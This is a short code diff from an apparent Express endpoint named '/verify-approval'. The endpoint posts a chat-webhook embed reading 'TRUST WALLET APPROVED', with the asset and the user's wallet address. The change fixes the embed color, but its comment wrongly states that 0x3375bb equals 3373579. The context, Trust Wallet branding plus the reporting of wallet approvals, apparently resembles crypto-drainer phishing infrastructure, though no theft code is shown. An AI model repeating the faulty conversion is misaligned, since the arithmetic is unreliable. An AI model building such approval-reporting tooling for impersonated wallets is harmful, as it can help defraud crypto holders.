@@ -50,7 +50,7 @@ app.get('/verify-approval', async (req, res) => {
                 content: "📱 **TRUST WALLET APPROVED**",
                 embeds: [{
                     title: "Wallet Connection Verified",
-                    color: 3375bb, // Trust Wallet blue
+                    color: 3373579, // Trust Wallet blue as number (0x3375bb = 3373579)
                     fields: [
                         { name: "Asset", value: "BNB Smart Chain (BNB)", inline: false },
                         { name: "Wallet", value: `\`${wallet}\``, inline: false },
